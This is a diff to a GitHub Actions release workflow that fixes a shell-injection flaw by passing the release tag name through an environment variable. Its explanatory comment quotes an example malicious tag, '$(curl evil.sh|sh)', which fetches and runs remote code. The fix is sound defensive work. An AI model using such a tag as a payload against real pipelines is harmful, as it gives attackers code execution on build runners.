@@ -33,9 +33,15 @@ jobs:
 
       - name: Which record does this tag belong in
         id: which
+        env:
+          TAG: ${{ github.event.release.tag_name }}
         run: |
           set -euo pipefail
-          TAG="${{ github.event.release.tag_name }}"
+          # A tag name is attacker-controlled text. Interpolated straight into
+          # `run:` it is SHELL: a tag called $(curl evil.sh|sh) executes. It
+          # comes through env, where the shell sees a variable and never a
+          # substitution. The Untrusted Input gate caught this on the commit
+          # that introduced it.
           case "$TAG" in
             t27c-v*)                       DEP="${{ vars.ZENODO_DEPOSITION_T27C }}" ;;
             golden-float-v*|v*)            DEP="${{ vars.ZENODO_DEPOSITION_GOLDEN_FLOAT }}" ;;
